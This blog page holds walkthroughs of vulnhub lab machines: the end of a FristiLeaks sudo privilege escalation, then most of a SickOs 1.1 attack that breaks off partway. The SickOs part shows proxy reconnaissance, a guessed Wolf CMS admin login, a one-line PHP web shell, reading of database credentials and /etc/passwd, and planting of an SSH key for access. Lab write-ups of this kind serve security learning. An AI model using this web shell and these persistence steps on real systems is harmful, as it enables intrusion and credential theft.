</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
</span><span class='line'>uid=0(root) gid=100(users) groups=100(users),502(fristigod)
</span><span class='line'>
</span><span class='line'>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom sh
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom sh
</span><span class='line'>
</span><span class='line'>sh-4.1# id
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=100(users) groups=100(users),502(fristigod)</span></code></pre></td></tr></table></div></figure>


<p>Finally the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.1# cat /root/fristileaks_secrets.txt
</span><span class='line'>cat /root/fristileaks_secrets.txt
</span><span class='line'>Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
</span><span class='line'>
</span><span class='line'>I wonder if you beat it in the maximum 4 hours it's supposed to take!
</span><span class='line'>
</span><span class='line'>Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Flag: Y0u_kn0w_y0u_l0ve_fr1st1</span></code></pre></td></tr></table></div></figure>


<p>Thanks for this challenge, it took me nearly 2 hours to finish.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/12/12/sickos-1-dot-1/">SickOs: 1.1</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-12-12T11:21:39+01:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:21 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1</a></p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ nmap 192.168.80.169
</span><span class='line'>22/tcp   open   ssh
</span><span class='line'>3128/tcp open   squid-http
</span><span class='line'>8080/tcp closed http-proxy</span></code></pre></td></tr></table></div></figure>


<p>There is an open proxy, we try internal network reconnaissance:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 http://192.168.80.169
</span><span class='line'>&lt;h1>
</span><span class='line'>BLEHHH!!!
</span><span class='line'>&lt;/h1></span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ dirb http://192.168.80.169:80 -p 192.168.80.169:3128
</span><span class='line'>...
</span><span class='line'>+ http://192.168.80.169:80/cgi-bin/ (CODE:403|SIZE:290)
</span><span class='line'>+ http://192.168.80.169:80/connect (CODE:200|SIZE:109)
</span><span class='line'>+ http://192.168.80.169:80/index (CODE:200|SIZE:21)
</span><span class='line'>+ http://192.168.80.169:80/index.php (CODE:200|SIZE:21)
</span><span class='line'>+ http://192.168.80.169:80/robots (CODE:200|SIZE:45)
</span><span class='line'>+ http://192.168.80.169:80/robots.txt (CODE:200|SIZE:45)
</span><span class='line'>+ http://192.168.80.169:80/server-status (CODE:403|SIZE:295)</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 http://192.168.80.169:80/robots.txt
</span><span class='line'>User-agent: *
</span><span class='line'>Disallow: /
</span><span class='line'>Dissalow: /wolfcms</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 http://192.168.80.169:80/connect
</span><span class='line'>#!/usr/bin/python
</span><span class='line'>
</span><span class='line'>print "I Try to connect things very frequently\n"
</span><span class='line'>print "You may want to try my services"</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 http://192.168.80.169:80/wolfcms/</span></code></pre></td></tr></table></div></figure>


<p>We found the Wolf CMS and to have easier access, we set the HTTP proxy in
Firefox. After a little googling, we found this
<a href="https://www.exploit-db.com/exploits/36818/">exploit</a>, but it only uploads php
shell and we can do this manually. To use this technique, we need credentials to log in via
<a href="http://192.168.80.169/wolfcms/?/admin/">admin interface</a>. One of our first guesses was
<code>admin/admin</code>, so we upload the file with the following content for RCE:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">cmd</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>As we can read in exploit, the uploaded files are available in <code>public</code> directory. Invoking a few commands:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la
</span><span class='line'>total 20
</span><span class='line'>drwxrwxrwx 4 root     root     4096 Dec 12 12:25 .
</span><span class='line'>drwxr-xr-x 5 root     root     4096 Dec  5 06:33 ..
</span><span class='line'>-rw-r--r-- 1 www-data www-data   32 Dec 12 12:29 a.php
</span><span class='line'>drwxrwxrwx 2 root     root     4096 Dec  5 06:05 images
</span><span class='line'>drwxrwxrwx 4 root     root     4096 Dec  5 06:05 themes</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+../"
</span><span class='line'>total 52
</span><span class='line'>drwxr-xr-x 5 root root 4096 Dec  5 06:33 .
</span><span class='line'>drwxrwxrwx 3 root root 4096 Dec  6 21:15 ..
</span><span class='line'>-rwxr-xr-x 1 root root  950 Dec  5 06:15 .htaccess
</span><span class='line'>-rwxrwxrwx 1 root root 4084 Dec  5 06:15 CONTRIBUTING.md
</span><span class='line'>-rwxrwxrwx 1 root root 2405 Dec  5 06:15 README.md
</span><span class='line'>-rwxrwxrwx 1 root root  403 Dec  5 06:15 composer.json
</span><span class='line'>-rwxrwxrwx 1 root root 3058 Dec  5 07:26 config.php
</span><span class='line'>drwxrwxrwx 2 root root 4096 Dec  5 06:15 docs
</span><span class='line'>-rwxrwxrwx 1 root root  894 Dec  5 06:15 favicon.ico
</span><span class='line'>-rwxrwxrwx 1 root root 6815 Dec  5 06:32 index.php
</span><span class='line'>drwxrwxrwx 4 root root 4096 Dec 12 12:25 public
</span><span class='line'>-rwxrwxrwx 1 root root    0 Dec  5 06:15 robots.txt
</span><span class='line'>drwxrwxrwx 7 root root 4096 Dec  5 06:25 wolf</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 http://192.168.80.169/wolfcms/public/a.php?cmd=netstat+-nalutp
</span><span class='line'>Active Internet connections (servers and established)
</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span><span class='line'>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
</span><span class='line'>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
</span><span class='line'>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60664    TIME_WAIT   -
</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60665    TIME_WAIT   -
</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60667    ESTABLISHED -
</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60666    TIME_WAIT   -
</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60662    CLOSE_WAIT  -
</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60663    CLOSE_WAIT  -
</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60661    CLOSE_WAIT  -
</span><span class='line'>tcp6       0      0 :::22                   :::*                    LISTEN      -
</span><span class='line'>tcp6       0      0 :::3128                 :::*                    LISTEN      -
</span><span class='line'>tcp6       0      0 192.168.80.169:60667    192.168.80.169:80       ESTABLISHED -
</span><span class='line'>tcp6       0      0 192.168.80.169:3128     192.168.80.137:54390    ESTABLISHED -
</span><span class='line'>udp        0      0 192.168.80.169:45534    192.168.80.2:53         ESTABLISHED 1703/netstat
</span><span class='line'>udp        0      0 192.168.80.169:37938    192.168.80.2:53         ESTABLISHED 1701/netstat
</span><span class='line'>udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
</span><span class='line'>udp        0      0 192.168.80.169:39007    192.168.80.2:53         ESTABLISHED 1705/netstat
</span><span class='line'>udp        0      0 0.0.0.0:53488           0.0.0.0:*                           -
</span><span class='line'>udp6       0      0 :::43051</span></code></pre></td></tr></table></div></figure>


<p>Here we found the database user credentials:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=cat+../config.php"
</span><span class='line'>&lt;?php
</span><span class='line'>
</span><span class='line'>// Database information:
</span><span class='line'>// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
</span><span class='line'>// The path can only be absolute path or :memory:
</span><span class='line'>// For more info look at: www.php.net/pdo
</span><span class='line'>
</span><span class='line'>// Database settings:
</span><span class='line'>define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
</span><span class='line'>define('DB_USER', 'root');
</span><span class='line'>define('DB_PASS', 'john@123');
</span><span class='line'>define('TABLE_PREFIX', '');
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Examining the MySQL database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=echo+mysql+-uroot+-pjohn@123+-e+status"
</span><span class='line'>mysql -uroot -pjohn@123 -e status
</span><span class='line'>
</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e+status"
</span><span class='line'>--------------
</span><span class='line'>mysql  Ver 14.14 Distrib 5.5.46, for debian-linux-gnu (i686) using readline 6.2
</span><span class='line'>
</span><span class='line'>Connection id:          149
</span><span class='line'>Current database:
</span><span class='line'>Current user:           root@localhost
</span><span class='line'>SSL:                    Not in use
</span><span class='line'>Current pager:          stdout
</span><span class='line'>Using outfile:          ''
</span><span class='line'>Using delimiter:        ;
</span><span class='line'>Server version:         5.5.46-0ubuntu0.12.04.2 (Ubuntu)
</span><span class='line'>Protocol version:       10
</span><span class='line'>Connection:             Localhost via UNIX socket
</span><span class='line'>Server characterset:    latin1
</span><span class='line'>Db     characterset:    latin1
</span><span class='line'>Client characterset:    latin1
</span><span class='line'>Conn.  characterset:    latin1
</span><span class='line'>UNIX socket:            /var/run/mysqld/mysqld.sock
</span><span class='line'>Uptime:                 1 hour 1 min 49 sec
</span><span class='line'>
</span><span class='line'>Threads: 1  Questions: 2646  Slow queries: 0  Opens: 64  Flush tables: 1  Open tables: 57  Queries per second avg: 0.713
</span><span class='line'>
</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e'show+databases'"
</span><span class='line'>Database
</span><span class='line'>information_schema
</span><span class='line'>mysql
</span><span class='line'>performance_schema
</span><span class='line'>wolf</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e'show+tables'"
</span><span class='line'>Tables_in_wolf
</span><span class='line'>cron
</span><span class='line'>layout
</span><span class='line'>page
</span><span class='line'>page_part
</span><span class='line'>page_tag
</span><span class='line'>permission
</span><span class='line'>plugin_settings
</span><span class='line'>role
</span><span class='line'>role_permission
</span><span class='line'>secure_token
</span><span class='line'>setting
</span><span class='line'>snippet
</span><span class='line'>tag
</span><span class='line'>user
</span><span class='line'>user_role</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e'select+*+from+user'"
</span><span class='line'>id      name    email   username        password        salt    language        last_login      last_failure    failure_count   created_on      updated_on created_by_id   updated_by_id
</span><span class='line'>1       Administrator   admin@yoursite.com      admin   3a1be46a798dce0d880f633ce195b676839a0ce344c917a7ea1270816dcb649ce1e2b811b56fe93c9d3c4e679151180129ee9483ea39bff4d4578c4be6c77e1f   6806b774443f2c34231eceddf156a42d3c26a2b5219ee9d55f5e3c9aea534167        en      2015-12-12 12:23:33     NULL       0       2015-12-05 06:25:06     2015-12-12 12:23:33     1       NULL</span></code></pre></td></tr></table></div></figure>


<p>Nothing interesting here, there is only one user and we already know his password.</p>

<p>We noticed that the user <code>www-data</code> has shell access:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=cat+/etc/passwd"
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:105::/var/run/dbus:/bin/false
</span><span class='line'>whoopsie:x:103:106::/nonexistent:/bin/false
</span><span class='line'>landscape:x:104:109::/var/lib/landscape:/bin/false
</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
</span><span class='line'>mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false</span></code></pre></td></tr></table></div></figure>


<p>Next idea is to upload ssh authorization key and log in via ssh.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=id"
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data"
</span><span class='line'>total 24
</span><span class='line'>drwxrwxrwx  3 root root 4096 Dec  6 21:15 .
</span><span class='line'>drwxr-xr-x 13 root root 4096 Dec 12 11:55 ..
</span><span class='line'>-rwxrwxrwx  1 root root  109 Dec  5 07:57 connect.py
</span><span class='line'>-rw-r--r--  1 root root   21 Dec  5 06:05 index.php
</span><span class='line'>-rw-r--r--  1 root root   45 Dec  5 06:05 robots.txt
</span><span class='line'>drwxr-xr-x  5 root root 4096 Dec  5 06:33 wolfcms
</span><span class='line'>
</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=mkdir+~www-data/.ssh"
</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data"
</span><span class='line'>total 28
</span><span class='line'>drwxrwxrwx  4 root     root     4096 Dec 12 13:07 .
</span><span class='line'>drwxr-xr-x 13 root     root     4096 Dec 12 11:55 ..
</span><span class='line'>drwxr-xr-x  2 www-data www-data 4096 Dec 12 13:07 .ssh
</span><span class='line'>-rwxrwxrwx  1 root     root      109 Dec  5 07:57 connect.py
</span><span class='line'>-rw-r--r--  1 root     root       21 Dec  5 06:05 index.php
</span><span class='line'>-rw-r--r--  1 root     root       45 Dec  5 06:05 robots.txt
</span><span class='line'>drwxr-xr-x  5 root     root     4096 Dec  5 06:33 wolfcms</span></code></pre></td></tr></table></div></figure>


<p>Creating ssh keypair:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ ssh-keygen -P "" -f blabla
</span><span class='line'>Generating public/private rsa key pair.
</span><span class='line'>Your identification has been saved in blabla.
</span><span class='line'>Your public key has been saved in blabla.pub.
</span><span class='line'>The key fingerprint is:
</span><span class='line'>4d:31:fb:7e:bd:82:c9:7f:21:ce:51:91:f3:76:a3:14 root@kali32
</span><span class='line'>The key's randomart image is:
</span><span class='line'>+---[RSA 2048]----+
</span><span class='line'>|          o     .|
</span><span class='line'>|           + E + |
</span><span class='line'>|          o   . +|
</span><span class='line'>|         o . . o+|
</span><span class='line'>|        S . o o.o|
</span><span class='line'>|           . + o |
</span><span class='line'>|          . * + o|
</span><span class='line'>|           + = ..|
</span><span class='line'>|            ..o. |
</span><span class='line'>+-----------------+
</span><span class='line'>
</span><span class='line'>root@kali32:~$ cat blabla.pub
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32</span></code></pre></td></tr></table></div></figure>


<p>To encode <code>+</code> characters, otherwise they are interpreted as spaces in url:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ cat blabla.pub  | sed 's#+#%2b#g'
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32</span></code></pre></td></tr></table></div></figure>


<p>To store public key as <code>authorized_keys</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=echo+'ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX'>~www-data/.ssh/authorized_keys"</span></code></pre></td></tr></table></div></figure>


<p>We verify the successful upload:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=cat+~www-data/.ssh/authorized_keys"
